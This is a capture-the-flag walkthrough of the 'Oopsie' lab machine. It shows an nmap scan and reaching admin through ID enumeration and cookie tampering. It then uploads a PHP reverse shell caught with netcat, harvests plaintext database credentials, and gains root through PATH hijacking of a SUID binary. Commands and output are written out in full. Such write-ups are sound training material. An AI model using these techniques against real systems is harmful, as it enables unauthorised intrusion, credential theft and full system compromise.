# Oopsie
### Tier 2
### Difficulty: Very Easy
**Target IP address:** 10.129.242.253 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Your IP address could be different*
***

<br>
First, we need to gather information about the target system or network in order to identify potential vulnerabilities and gain insights that can be exploited. We will use `sudo nmap -sC -sV 10.129.242.253` to scan open ports.

```
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.129.242.253
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
```

We can see two ports open: **port 22 for SSH and port 80 for HTTP**.

Next, we will paste the 10.129.242.253 in our browser. It returns a website for MegaCorp Automotive, a car manufacturer company. At the bottom of the page, we can see the message "Please login to get access to the service.". Now we aware that is has a login page.<br>
We tried `10.129.242.253/login` in our browser, but it returned a 404 Not Found error. We need to find another way.

To proceed, we will use **BurpSuite** and configure it to send traffic through a proxy. In our browser, we navigate to `Definitions` and search for `proxy`. Then, we select the `Manual proxy configuration` option and enter the IP address 127.0.0.1 and port 8080, which is where Burp Proxy is listening.

We also need to disable interception in Burp Suite because it's enabled by default. To do this, we navigate to the `Proxy` tab, and under the `Intercept` subtab, we select the button to disable interception.

Now that everything is set up correctly, we refresh the page in our browser and switch to Burp Suite. We go to the `Target` tab and select the `Sitemap` option.

In the sitemap, we can see some hidden directories and files. One of the directories is the login page: `/cdn-cgi/login`. We paste the path into our browser `10.129.242.253/cdn-cgi/login`, and we are presented with the login page. Since we don't have any credentials, and the default ones didn't work, we will choose the option to `Login as Guest`.

We are in. While browsing through the different pages, we spot an interesting page called `Uploads`. However, we receive an error because we don't have permission. We need super admin rights.

We check the `Account` tab and see this:

| Access ID    | Name         | Email                |
| :---------:  | :---------:  | :---------:          |
| 2233         | guest        | guest@megacorp.com   |

We check the link `http://10.129.242.253/cdn-cgi/login/admin.php?content=accounts&id=2` and wee see that the this user has an id of 2. We can try to manually enumerate the users by changing the ID in the URL to 1 and see if anything changes. It does. We are now presented with the admin role and user.

| Access ID    | Name         | Email                |
| :---------:  | :---------:  | :---------:          |
| 34322        | admin        | admin@megacorp.com   |

To escalate our privileges, we can manipulate the cookies. `Right-click` on the web page and select `Inspect`. Then, navigate to `Storage`," where the cookies are stored. We observe that the cookies contain `role=guest` and "`user=2233`.
We can try changing the values in our cookie do match the `admin` user to see if we can obtain admin permissions.

And we succeed. We gain access to the upload form. We can attempt to upload a **PHP reverse shell**. We modify the `$ip` and `$port` variables to match our own, changing `$port` to 4444.

To find the directory of the `Uploads` page, we use `gobuster` to search for hidden directories. Gobuster reveals the `/uploads` directory. Although we don't have permission to access the directory, we can try to access our uploaded file.

Next, we set up a `netcat` connection to listen on our chosen port `nc -lvnp 4444`.

Then, we request our shell through the web browser: `http://10.129.242.253/uploads/php-reverse_shell.php`. We are successfull.

```
$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.196] from (UNKNOWN) [10.129.242.253] 42560
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:43:31 up 56 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

We successfully obtain a reverse shell. However, to have a fully functional shell, we need to run `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

As user www-data we can't achieve many things as the role has restricted access on the system. After some time we find some promising php files under `/var/www/html/cdn-cgi/login`<br>
```
www-data@oopsie:/var$ cd /var/www/html/cdn-cgi/login 
cd /var/www/html/cdn-cgi/login
```

We have two options for reviewing the source code:
* **Manual review** we can manually go through the source code of all the pages.
* **Using the grep tool** grep is a powerful tool for searching patterns in files. We can use grep with `cat * | grep -i passw`. This command reads all files `cat *` and searches for the pattern passw (case-insensitive with -i). It can match strings like *passwd* or *password*. By using grep, we can search for interesting strings in the source code efficiently.<br>
```
$ cat * | grep -i passw*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
```

We find a password `MEGACORP_4dm1n!!`.

We can check the available users on the system by reading the `/etc/password` file.<br>
<pre>
$ cat /etc/passwd

<i>ABBREVIATED</i>

uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
<b>robert</b>:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
</pre>


We found user `robert`. In order to login as this user, we use `su robert`. We can try our previously found password `MEGACORP_4dm1n!!`, but with are unsuccesful.

The password We need to keep searching. Lets check the files one by one. Let's start with db.php.<br>
```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

We find that the password for robert is `M3g4C0rpUs3r!`.

Now we can log in as robert.
```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cd ../../../../../
cd ../../../../../
www-data@oopsie:/$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/$ 
```

The flag can be found in the home directory of robert:
```
robert@oopsie:/$ cd /home/robert
cd /home/robert
robert@oopsie:~$ ls
ls
user.txt
robert@oopsie:~$ cat user.txt
cat user.txt
********************************
```

Before attempting any privilege escalation, let's check basic commands for elevating privileges, such as `sudo` and `id`:

```
robert@oopsie:~$ sudo -l
sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.
robert@oopsie:~$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
robert@oopsie:~$ 
```

We observe that robert is part of the group `bugtracker`." Let's see if there is any relevant binary within that group:
```
robert@oopsie:~$ find / -group bugtracker 2>/dev/null
find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

We found a file named `bugtracker` with `suid` privileges, which looks promising. To gather more information, we run the following commands:

```
robert@oopsie:~$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```

The binary has `suid` permissions, indicating potential exploitation. We run the application to observe how it behaves.

```
robert@oopsie:~$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

cat: /root/reports/12: No such file or directory
```

The tool accepts user input as a filename for reading using the cat command. However, it does not specify the complete file path for cat, which creates a potential vulnerability that we may be able to exploit.  To exploit this, we navigate to the `/tmp` directory and create a file named `cat`:

```
robert@oopsie:/$ cd /tmp           
cd /tmp
robert@oopsie:/tmp$ echo '/bin/sh' > cat
echo '/bin/sh' > cat
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Finally, we execute the bugtracker application from the /tmp directory:

```
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

# whoami
whoami
root
```

The root flgag can be found in the `/root` folder:

```
# cd /root
cd /root
# ls
ls
reports  root.txt
# cat root.txt
cat root.txt
# /bin/cat root.txt
/bin/cat root.txt
********************************
```

**The end.**